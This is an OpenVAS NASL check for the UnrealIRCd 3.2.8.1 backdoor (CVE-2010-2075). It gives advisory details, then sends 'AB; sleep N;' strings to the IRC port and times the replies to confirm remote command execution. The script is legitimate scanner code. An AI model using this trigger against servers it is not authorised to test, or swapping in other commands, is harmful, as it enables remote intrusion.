# SPDX-FileCopyrightText: 2010 Vlatko Kosturjak
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later

CPE = "cpe:/a:unrealircd:unrealircd";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.80111");
  script_version("2025-03-21T05:38:29+0000");
  script_tag(name:"last_modification", value:"2025-03-21 05:38:29 +0000 (Fri, 21 Mar 2025)");
  script_tag(name:"creation_date", value:"2010-06-13 17:55:39 +0200 (Sun, 13 Jun 2010)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2010-2075");
  script_name("UnrealIRCd Backdoor");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Vlatko Kosturjak");
  script_family("Gain a shell remotely");
  script_dependencies("gb_unrealircd_detect.nasl");
  script_require_ports("Services/irc", 6667);
  script_mandatory_keys("UnrealIRCD/Detected"); # TBD: Only ircd/detected?

  script_xref(name:"URL", value:"http://www.unrealircd.com/txt/unrealsecadvisory.20100612.txt");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2010/Jun/277");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/40820");

  script_tag(name:"summary", value:"Detection of backdoor in UnrealIRCd.");

  script_tag(name:"insight", value:"Remote attackers can exploit this issue to execute arbitrary
  system commands within the context of the affected application.");

  script_tag(name:"affected", value:"The issue affects Unreal 3.2.8.1 for Linux. Reportedly package
  Unreal3.2.8.1.tar.gz downloaded in November 2009 and later is affected. The MD5 sum of the
  affected file is 752e46f2d873c1679fa99de3f52a274d. Files with MD5 sum of
  7b741e94e867c0a7370553fd01506c66 are not affected.");

  script_tag(name:"solution", value:"Install latest version of unrealircd and check signatures of
  software you're installing.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

if( ! sock = open_sock_tcp( port ) )
  exit( 0 );

line = recv( socket:sock, length:16384 ); # nb: clear buffer

foreach i( make_list(3, 5, 10) ) {

  reqstr = string( "AB; sleep ", i, ";\n" );
  send( socket:sock, data:reqstr );
  start = unixtime();
  line = recv_line( socket:sock, length:4096 );
  stop = unixtime();
  if( stop - start < i || stop - start > ( i + 5 ) ) {
    close( sock );
    exit( 0 );
  }
}

close( sock );
security_message( port:port );

exit( 0 );
